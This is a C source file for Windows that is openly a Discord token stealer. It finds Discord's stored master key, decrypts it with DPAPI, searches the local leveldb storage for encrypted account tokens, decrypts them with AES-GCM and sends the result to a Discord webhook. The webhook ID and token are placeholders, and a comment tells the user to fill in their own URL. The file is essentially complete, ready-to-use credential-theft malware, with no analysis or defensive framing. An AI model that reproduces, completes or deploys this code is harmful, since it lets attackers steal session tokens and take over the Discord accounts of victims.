#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")

static unsigned char* b64decode(const char* encoded, DWORD* outSize) {
    DWORD size = 0;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL))
        return NULL;
    unsigned char* data = (unsigned char*)malloc(size);
    if (!data) return NULL;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, data, &size, NULL, NULL)) {
        free(data);
        return NULL;
    }
    *outSize = size;
    return data;
}

static char* readFile(const wchar_t* path, size_t* outSize) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }
    char* buf = (char*)malloc(size + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    DWORD read = 0;
    if (!ReadFile(h, buf, size, &read, NULL) || read != size) {
        free(buf);
        CloseHandle(h);
        return NULL;
    }
    buf[size] = '\0';
    CloseHandle(h);
    *outSize = size;
    return buf;
}

static char* extractEncryptedKey(const char* json, size_t jsonLen) {
    const char* pattern = "\"encrypted_key\":\"";
    const char* start = strstr(json, pattern);
    if (!start) return NULL;
    start += strlen(pattern);
    const char* end = strchr(start, '\"');
    if (!end) return NULL;
    size_t keyLen = end - start;
    char* key = (char*)malloc(keyLen + 1);
    if (!key) return NULL;
    memcpy(key, start, keyLen);
    key[keyLen] = '\0';
    return key;
}

static unsigned char* decryptDPapi(const unsigned char* blob, DWORD blobSize, DWORD* outSize) {
    const unsigned char dpapiPrefix[] = { 0x44, 0x50, 0x41, 0x50, 0x49 };
    if (blobSize >= 5 && memcmp(blob, dpapiPrefix, 5) == 0) {
        blob += 5;
        blobSize -= 5;
    }
    DATA_BLOB inBlob;
    inBlob.pbData = (BYTE*)blob;
    inBlob.cbData = blobSize;
    DATA_BLOB outBlob = { 0 };
    if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) return NULL;
    unsigned char* result = (unsigned char*)malloc(outBlob.cbData);
    if (result) {
        memcpy(result, outBlob.pbData, outBlob.cbData);
        *outSize = outBlob.cbData;
    }
    LocalFree(outBlob.pbData);
    return result;
}

static unsigned char* grepMasterKey(size_t* outSize) {
    wchar_t path[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path))) return NULL;
    wcscat_s(path, MAX_PATH, L"\\discord\\Local State");
    if (!PathFileExistsW(path)) return NULL;

    size_t jsonLen = 0;
    char* json = readFile(path, &jsonLen);
    if (!json) return NULL;

    char* base64Key = extractEncryptedKey(json, jsonLen);
    free(json);
    if (!base64Key) return NULL;

    DWORD blobSize = 0;
    unsigned char* encryptedBlob = b64decode(base64Key, &blobSize);
    free(base64Key);
    if (!encryptedBlob) return NULL;

    DWORD keySize = 0;
    unsigned char* decryptedKey = decryptDPapi(encryptedBlob, blobSize, &keySize);
    free(encryptedBlob);
    if (!decryptedKey) return NULL;

    *outSize = keySize;
    return decryptedKey;
}

static unsigned char* loadMaster(const wchar_t* path, size_t* outLen) {
    size_t fileLen = 0;
    char* hex = readFile(path, &fileLen);
    if (!hex) return NULL;
    if (fileLen == 0 || (fileLen % 2) != 0) { free(hex); return NULL; }

    size_t keyLen = fileLen / 2;
    unsigned char* key = (unsigned char*)malloc(keyLen);
    if (!key) { free(hex); return NULL; }

    for (size_t i = 0; i < keyLen; i++) {
        char c1 = hex[i * 2];
        char c2 = hex[i * 2 + 1];
        int v1 = (c1 >= '0' && c1 <= '9') ? c1 - '0' :
                 (c1 >= 'a' && c1 <= 'f') ? c1 - 'a' + 10 :
                 (c1 >= 'A' && c1 <= 'F') ? c1 - 'A' + 10 : -1;
        int v2 = (c2 >= '0' && c2 <= '9') ? c2 - '0' :
                 (c2 >= 'a' && c2 <= 'f') ? c2 - 'a' + 10 :
                 (c2 >= 'A' && c2 <= 'F') ? c2 - 'A' + 10 : -1;
        if (v1 < 0 || v2 < 0) { free(hex); free(key); return NULL; }
        key[i] = (unsigned char)((v1 << 4) | v2);
    }
    free(hex);
    *outLen = keyLen;
    return key;
}

static char* grepToken(void) {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        wcscat_s(path, MAX_PATH, L"\\discord\\Local Storage\\leveldb");
        if (!PathFileExistsW(path)) {
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
                wcscat_s(path, MAX_PATH, L"\\discord\\Local Storage\\leveldb");
                if (!PathFileExistsW(path))
                    return NULL;
            }
            else return NULL;
        }
    }
    else return NULL;

    wchar_t search[MAX_PATH];
    wcscpy_s(search, MAX_PATH, path);
    wcscat_s(search, MAX_PATH, L"\\*.*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return NULL;

    const char* prefix = "dQw4w9WgXcQ:";
    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        const wchar_t* ext = PathFindExtensionW(fd.cFileName);
        if (_wcsicmp(ext, L".ldb") != 0 && _wcsicmp(ext, L".log") != 0) continue;

        wchar_t full[MAX_PATH];
        wcscpy_s(full, MAX_PATH, path);
        wcscat_s(full, MAX_PATH, L"\\");
        wcscat_s(full, MAX_PATH, fd.cFileName);

        size_t fileSize = 0;
        char* content = readFile(full, &fileSize);
        if (!content) continue;

        for (size_t i = 0; i < fileSize; i++) {
            if (content[i] == 'd' && i + 11 < fileSize &&
                memcmp(content + i, prefix, 12) == 0) {
                size_t start = i + 12;
                size_t end = start;
                while (end < fileSize && strchr(base64_chars, content[end])) {
                    end++;
                }
                size_t tokenLen = end - i;
                char* token = (char*)malloc(tokenLen + 1);
                if (!token) {
                    free(content);
                    FindClose(hFind);
                    return NULL;
                }
                memcpy(token, content + i, tokenLen);
                token[tokenLen] = '\0';
                free(content);
                FindClose(hFind);
                return token;
            }
        }
        free(content);
    } while (FindNextFileW(hFind, &fd) != 0);

    FindClose(hFind);
    return NULL;
}

static char* decrypt_token(const char* token, const unsigned char* key, size_t keyLen) {
    const char* colon = strchr(token, ':');
    if (!colon) return NULL;
    const char* payload_b64 = colon + 1;

    DWORD payloadLen = 0;
    unsigned char* payload = b64decode(payload_b64, &payloadLen);
    if (!payload) return NULL;

    if (payloadLen < 3 || memcmp(payload, "v10", 3) != 0) {
        free(payload);
        return NULL;
    }

    size_t offset = 3;
    if (payloadLen < offset + 12 + 16) {
        free(payload);
        return NULL;
    }

    unsigned char* nonce = payload + offset;
    size_t ciphertext_len = payloadLen - offset - 12 - 16;
    unsigned char* ciphertext = payload + offset + 12;
    unsigned char* tag = payload + offset + 12 + ciphertext_len;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM,
        MS_PRIMITIVE_PROVIDER, 0);
    if (!BCRYPT_SUCCESS(status)) { free(payload); return NULL; }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(payload);
        return NULL;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
        (PUCHAR)key, (ULONG)keyLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(payload);
        return NULL;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;

    unsigned char* plaintext = (unsigned char*)malloc(ciphertext_len + 1);
    if (!plaintext) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(payload);
        return NULL;
    }
    ULONG plaintext_len = 0;

    status = BCryptDecrypt(
        hKey,
        (PUCHAR)ciphertext, (ULONG)ciphertext_len,
        &authInfo,
        NULL, 0,
        plaintext, (ULONG)ciphertext_len,
        &plaintext_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    free(payload);

    if (!BCRYPT_SUCCESS(status)) {
        free(plaintext);
        return NULL;
    }

    plaintext[plaintext_len] = '\0';
    return (char*)plaintext;
}

void webhook(const char *plain) {
    const wchar_t *host = L"discord.com";
    const wchar_t *path =
        L"/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
    char json[8192];

    snprintf(json, sizeof(json),
        "{\"content\":\"%s\"}", plain);

    HINTERNET session = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!session) return;

    HINTERNET connection = WinHttpConnect(session, host, INTERNET_DEFAULT_HTTPS_PORT, 0);

    if (!connection) {
        WinHttpCloseHandle(session);
        return;
    }

    HINTERNET request = WinHttpOpenRequest(
        connection,
        L"POST",
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!request) {
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(session);
        return;
    }

    BOOL sent = WinHttpSendRequest(
        request,
        L"Content-Type: application/json\r\n",
        (DWORD)-1,
        json,
        (DWORD)strlen(json),
        (DWORD)strlen(json),
        0
    );

    if (sent) sent = WinHttpReceiveResponse(request, NULL);

    if (sent) {
        DWORD status = 0;
        DWORD size = sizeof(status);

        WinHttpQueryHeaders(
            request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &status,
            &size,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);
}

int main(void) {
    SetConsoleOutputCP(CP_UTF8);

    size_t keyLen = 0;
    unsigned char* masterKey = grepMasterKey(&keyLen);

    masterKey = NULL;
    masterKey = loadMaster(L"masterkey.txt", &keyLen);

    char* token = grepToken();
    char* plain = decrypt_token(token, masterKey, keyLen);

    free(token);
    free(masterKey);

    webhook(plain); // check webhook function and change the webhook url btw
    free(plain);
    return 0;
}
